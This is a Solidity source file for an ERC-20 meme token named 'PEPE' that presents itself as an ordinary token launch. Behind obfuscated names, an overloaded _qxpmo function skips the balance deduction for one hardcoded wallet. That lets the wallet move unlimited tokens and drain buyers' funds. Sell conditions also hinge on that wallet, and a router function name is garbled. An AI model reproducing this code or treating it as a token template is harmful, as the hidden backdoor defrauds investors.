/*

PEPE   $ƎԀƎԀ


TWITTER: https://twitter.com/PepeErc20_X
TELEGRAM: https://t.me/PepeErc20_X
WEBSITE: https://www.pepe69.net/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qxpmo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qxpmo(a, b, "SafeMath:");
    }

    function  _qxpmo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kohvueomp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pforajuvms {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract PEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"PEPE";
    string private constant _symbol = unicode"ƎԀƎԀ";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalmw = 42069000000 * 10 **_decimals;
    uint256 public _mxTvmvAmaunt = _Totalmw;
    uint256 public _Wallekbumo = _Totalmw;
    uint256 public _wapThresholdmcx= _Totalmw;
    uint256 public _mkylToxhp= _Totalmw;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEthauForf;
    mapping (address => bool) private _taxvWalrvy;
    mapping(address => uint256) private _lruekrkeacp;
    bool public _tlaeresluove = false;
    address payable private _qhuobauq;


    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBefaebnt=0;
    uint256 private _burarbmw=0;


    _pforajuvms private _qomRatobct;
    address private _acGudvatuw;
    bool private _provuhevh;
    bool private iovSwpuwq = false;
    bool private _aquEabuyp = false;


    event _amrfolytl(uint _mxTvmvAmaunt);
    modifier lokocThtrap {
        iovSwpuwq = true;
        _;
        iovSwpuwq = false;
    }

    constructor () {

        _qhuobauq = payable(0x483d8398d8f34A935C10A9C48943CDd04C8D45E5);
        _balances[_msgSender()] = _Totalmw;
        _isEthauForf[owner()] = true;
        _isEthauForf[address(this)] = true;
        _isEthauForf[_qhuobauq] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalmw);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalmw;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qxpmo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlaeresluove) {
                if (to != address
                (_qomRatobct) && to !=
                 address(_acGudvatuw)) {
                  require(_lruekrkeacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruekrkeacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acGudvatuw && to != 
            address(_qomRatobct) && !_isEthauForf[to] ) {
                require(amount <= _mxTvmvAmaunt,
                 "Exceeds the _mxTvmvAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallekbumo, "Exceeds the maxWalletSize.");
                if(_burarbmw
                < _wapBefaebnt){
                  require(! _faeqauz(to));
                }
                _burarbmw++;
                 _taxvWalrvy[to]=true;
                teeomoun = amount.mul((_burarbmw>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acGudvatuw && from!= address(this) 
            && !_isEthauForf[from] ){
                require(amount <= _mxTvmvAmaunt && 
                balanceOf(_qhuobauq)<_mkylToxhp,
                 "Exceeds the _mxTvmvAmaunt.");
                teeomoun = amount.mul((_burarbmw>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burarbmw>_wapBefaebnt &&
                 _taxvWalrvy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iovSwpuwq 
            && to == _acGudvatuw && _aquEabuyp &&
             contractTokenBalance>_wapThresholdmcx 
            && _burarbmw>_wapBefaebnt&&
             !_isEthauForf[to]&& !_isEthauForf[from]
            ) {
                _swpzuvrkmj( _qxmve(amount, 
                _qxmve(contractTokenBalance,_mkylToxhp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmojveup(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qxpmo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qxpmo(teeomoun));
        emit Transfer(from, to, 
        amount. _qxpmo(teeomoun));
    }

    function _swpzuvrkmj(uint256
     tokenAmount) private lokocThtrap {
        if(tokenAmount==0){return;}
        if(!_provuhevh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _qomRatobct.WETH();
        _approve(address(this),
         address(_qomRatobct), tokenAmount);
        _qomRatobct.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qxmve(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qxpmo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qhuobauq){
            return a ;
        }else{
            return a . _qxpmo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTvmvAmaunt = _Totalmw;
        _Wallekbumo = _Totalmw;
        _tlaeresluove = false;
        emit _amrfolytl(_Totalmw);
    }

    function _faeqauz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmojveup(uint256
    amount) private {
        _qhuobauq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _provuhevh);
        _qomRatobct   =  _pforajuvms (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_qomRatobct), _Totalmw);
        _acGudvatuw = _kohvueomp(_qomRatobct.factory()). createPair (address(this),  _qomRatobct . WETH ());
        _qomRatobct.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acGudvatuw).approve(address(_qomRatobct), type(uint).max);
        _aquEabuyp = true;
        _provuhevh = true;
    }

    receive() external payable {}
}